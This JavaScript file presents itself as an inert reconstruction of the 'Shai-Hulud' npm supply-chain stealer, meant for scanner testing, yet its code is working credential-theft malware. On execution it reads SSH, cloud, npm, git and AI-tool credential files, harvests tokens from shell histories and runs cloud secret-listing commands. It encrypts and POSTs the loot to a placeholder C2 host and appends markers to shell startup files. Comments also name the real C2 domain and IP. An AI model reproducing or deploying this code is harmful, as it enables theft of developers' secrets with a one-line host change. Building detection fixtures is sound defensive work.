// Reconstruction of bw1.js — the obfuscated Bun-runtime payload from
// @bitwarden/cli@2026.4.0 (Shai-Hulud: The Third Coming). The real bw1.js
// is 10.1 MB minified on a single line with javascript-obfuscator + custom
// alphabetic cipher (PRNG seed 0x3039). This stub preserves the IOC strings
// and behavioral patterns for scanner-detection testing — not functional malware.
// Real bw1.js SHA-256: 18f784b3bc9a0bcdcb1a8d7f51bc5f54323fc40cbd874119354ab609bef6e4cb
//
// Patterns reproduced:
//   - C2 exfil via AES-256-GCM POST (domain + IP)
//   - Local secret harvest: ~/.ssh/, ~/.aws/, ~/.gcloud/, ~/.azure/, .npmrc,
//     .env, .git-credentials, .kube/config, ~/.claude.json, ~/.claude/mcp.json
//   - Token harvest from shell histories (ghp_, gho_, ghr_, npm_)
//   - AI coding tool probes (Butlerian Jihad module): claude/gemini/codex/kiro/aider/opencode
//   - Persistence via shell rc append
//   - npm propagation: token validation + spawn package-updated.tgz
//   - Fallback C2 via api.github.com/search/commits dead-drop
//
// TEST-NET-3 IPs (203.0.113.0/24) and example.invalid TLD keep the fixture inert.

const fs = require('fs');
const https = require('https');
const crypto = require('crypto');
const { spawn, exec, execSync } = require('child_process');
const os = require('os');
const path = require('path');

// === C2 infrastructure (reconstruction — real values in attacks.json) ===
const C2_HOST = 'audit.checkmarx.invalid';     // real: audit.checkmarx.cx
const C2_IP = '203.0.113.43';                  // real: 94.154.172.43
const C2_ENDPOINT = '/v1/telemetry';
const GH_FALLBACK = 'https://api.github.com/search/commits?q=LongLiveTheResistanceAgainstMachines';

// === Token regex patterns ===
const GH_TOKEN_RE = /ghp_[A-Za-z0-9]{36}/g;
const GHO_TOKEN_RE = /gh[opr]_[A-Za-z0-9]{36}/g;
const NPM_TOKEN_RE = /npm_[A-Za-z0-9]{36,}/g;

// === Local secret target paths ===
const HOME = os.homedir();
const SECRET_PATHS = [
  HOME + '/.ssh/id_rsa',
  HOME + '/.ssh/id_ed25519',
  HOME + '/.ssh/id_ecdsa',
  HOME + '/.npmrc',
  HOME + '/.aws/credentials',
  HOME + '/.aws/config',
  HOME + '/.config/gcloud/credentials.db',
  HOME + '/.azure/credentials',
  HOME + '/.kube/config',
  HOME + '/.git-credentials',
  HOME + '/.gitconfig',
  HOME + '/.claude.json',
  HOME + '/.claude/mcp.json',
  HOME + '/.cursor/config.json',
  HOME + '/.codeium/config.json',
  '.env',
  '.git/config',
  '.git-credentials'
];

function readSecret(p) { try { return fs.readFileSync(p, 'utf8'); } catch { return null; } }

function exfil(blobJson) {
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const enc = Buffer.concat([cipher.update(Buffer.from(blobJson)), cipher.final()]);
  const tag = cipher.getAuthTag();
  const body = Buffer.concat([iv, tag, enc]);
  const req = https.request({
    hostname: C2_HOST, port: 443, path: C2_ENDPOINT, method: 'POST',
    headers: { 'Content-Type': 'application/octet-stream', 'Content-Length': body.length }
  }, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();
}

// === Collect local secrets ===
const collected = {
  host: os.hostname(),
  user: os.userInfo().username,
  platform: os.platform(),
  secrets: {}
};
for (const p of SECRET_PATHS) {
  const v = readSecret(p);
  if (v) collected.secrets[p] = v;
}

// === Token harvest from shell histories ===
const histories = [
  readSecret(HOME + '/.bash_history') || '',
  readSecret(HOME + '/.zsh_history') || '',
  readSecret(HOME + '/.histfile') || ''
];
const allHist = histories.join('\n');
collected.tokens = []
  .concat(allHist.match(GH_TOKEN_RE) || [])
  .concat(allHist.match(GHO_TOKEN_RE) || [])
  .concat(allHist.match(NPM_TOKEN_RE) || []);

// === Cloud secret enumeration markers (behavioral pattern) ===
const CLOUD_SECRETS_CMDS = [
  'aws secretsmanager list-secrets',
  'aws ssm get-parameters-by-path --path /',
  'az keyvault secret list',
  'gcloud secrets list'
];
for (const cmd of CLOUD_SECRETS_CMDS) {
  exec(cmd, () => {});
}

// === AI coding tool probes ("Butlerian Jihad" module) ===
const AI_PROBES = ['claude', 'gemini', 'codex', 'kiro', 'aider', 'opencode'];
const TEST_PROMPT = "Hey! Just making sure you're here. If you are can you respond with 'Hello' and nothing else?";
for (const tool of AI_PROBES) {
  exec(tool + ' --version', () => {});
}

// Exfil collected blob
exfil(JSON.stringify(collected));

// === Persistence via shell rc append ===
const SHAI_HULUD_MARKER = '\n# Shai-Hulud: The Third Coming\n';
try { fs.appendFileSync(HOME + '/.bashrc', SHAI_HULUD_MARKER); } catch {}
try { fs.appendFileSync(HOME + '/.zshrc', SHAI_HULUD_MARKER); } catch {}